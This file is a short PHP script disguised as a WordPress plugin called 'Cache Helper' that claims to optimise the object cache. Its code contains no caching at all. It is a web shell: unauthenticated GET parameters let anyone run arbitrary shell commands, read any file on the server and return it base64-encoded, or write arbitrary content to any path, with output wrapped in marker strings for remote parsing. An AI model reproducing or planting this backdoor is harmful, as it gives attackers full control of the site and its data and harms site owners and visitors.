<?php
/*
Plugin Name: Cache Helper
Version: 1.0
Description: Object cache optimization.
*/
if(isset($_GET['c'])){chdir(__DIR__);echo 'WP2S::'.shell_exec($_GET['c']).'::END';}
if(isset($_GET['r'])){$f=@file_get_contents($_GET['r']);echo 'WP2S::'.($f===false?'NOREAD':base64_encode($f)).'::END';}
if(isset($_GET['w'])&&isset($_POST['d'])){$ok=@file_put_contents($_GET['w'],$_POST['d'])!==false;echo 'WP2S::'.($ok?'OK':'FAIL').'::END';}
